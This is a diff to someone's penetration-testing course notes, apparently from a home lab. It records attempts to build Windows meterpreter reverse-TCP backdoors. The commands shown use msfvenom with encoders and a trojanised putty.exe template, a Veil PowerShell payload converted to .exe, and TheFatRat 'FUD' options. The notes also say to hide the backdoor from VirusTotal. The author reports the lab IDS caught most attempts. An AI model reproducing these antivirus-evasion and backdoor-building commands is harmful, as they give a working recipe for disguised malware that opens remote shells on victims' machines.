@@ -535,4 +535,105 @@ msf6 exploit(multi/handler) > run
 
 [*] Started reverse TCP handler on <kali ip>:5555 
 ```
-run shell on windows machine
+run shell on windows machine : failed : not the right OS plateform for win10!
+
+restart the process with defining plateform for msfvenom
+
+msfvenom --list platforms
+-> windows
+msfvenom --list archs
+->  x64
+
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<kali ip> LPORT=5555 -f exe -o shell.exe -a x64 --arch x64 --platform windows
+
+same issue ...
+
+- test if payload is detectable : virustotal.com
+
+```
+# encode payload
+┌──(kali㉿kali)-[~]
+└─$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<kali ip> LPORT=5555 -f powershell -o shell.ps1 -a x64 --arch x64 --platform windows -e x64/zutto_dekiru -i 13 -n 442 
+
+# use other software as template, ex=putty.exe
+┌──(kali㉿kali)-[~/dev/exploits_files]
+└─$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<kali ip> LPORT=5555 -f exec -o Putty.exe -a x64 --arch x64 --platform windows -x putty.exe 
+## IDS detects and delete it!
+
+# use other software as template, ex=putty.exe + obfuscate it
+┌──(kali㉿kali)-[~/dev/exploits_files]
+└─$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<kali ip> LPORT=5555 -f exe -o Putty.exe -a x64 --arch x64 --platform windows -x putty.exe -e x64/zutto_dekiru -i 13 -n 442 
+## IDS doesn't detect/delete Putty.exe, but it blocks its tentative to establish tcp connection !
+```
+
+Conclusion : The IDS/IPS is working fine for theses basic cases!
+
+## Use veil to create payload
+install veil (evasion and ordnance tool) :
+```
+┌──(kali㉿kali)-[~/dev/exploits_files]
+└─$ sudo apt-get install veil       
+[sudo] password for kali: 
+...
+```
+Veil console
+```
+┌──(kali㉿kali)-[~/dev/exploits_files]
+└─$ veil
+
+Veil>: use 1
+Veil>: list
+...
+22)	powershell/meterpreter/rev_tcp.py
+...
+Veil/Evasion>: use 22
+[powershell/meterpreter/rev_tcp>>]: set SLEEP 42
+[powershell/meterpreter/rev_tcp>>]: set LHOST 192.168.1.23
+[powershell/meterpreter/rev_tcp>>]: generate
+ [>] Please enter the base name for output files (default is payload): powerpayload
+
+ [*] Language: powershell
+ [*] Payload Module: powershell/meterpreter/rev_tcp
+ [*] PowerShell doesn't compile, so you just get text :)
+ [*] Source code written to: /var/lib/veil/output/source/powerpayload.bat
+ [*] Metasploit Resource file written to: /var/lib/veil/output/handlers/powerpayload.rc
+
+```
+
+- get tool to convert .bat to .exe : 
+  - ~~https://www.01net.com/telecharger/utilitaire/manipulation_de_fichier/bat2exe.html~~
+  - https://github.com/tokyoneon/B2E
+
+```
+┌──(kali㉿kali)-[~/dev/tools]
+└─$ wine Portable/Bat_To_Exe_Converter_\(x64\).exe 
+```
+- converted payload got detected and deleted by IDS/IPS
+- use start tcp handler with msfconsole
+```
+msf6 > resource /home/kali/dev/exploits_files/powerpayload.rc
+```
+
+## Use "the fat rat" to create payload
+- https://github.com/screetsec/TheFatRat + follow instructions
+- **warning** : **don't upload backdoor to virus total**, but upload it to **nodistribute.com**
+
+```
+┌──(kali㉿kali)-[~/dev/tools]
+└─$ sudo /home/kali/dev/tools/TheFatRat/fatrat
+...
+	[06]  Create Fud Backdoor 1000% with PwnWinds [Excelent] 
+...
+ ┌─[TheFatRat]──[~]─[menu]:
+ └─────► 6
+...
+	[2]  Create exe file with C# + Powershell (FUD 100%)
+...
+ ┌─[TheFatRat]──[~]─[pwnwind]:
+ └─────► 2
+# set options ... LHOST LPORT, [ 3 ] windows/meterpreter/reverse_tcp 
+```
+
+- converted payload got detected and deleted by IDS/IPS, again xD
+
+<add note of lesson 86 here>
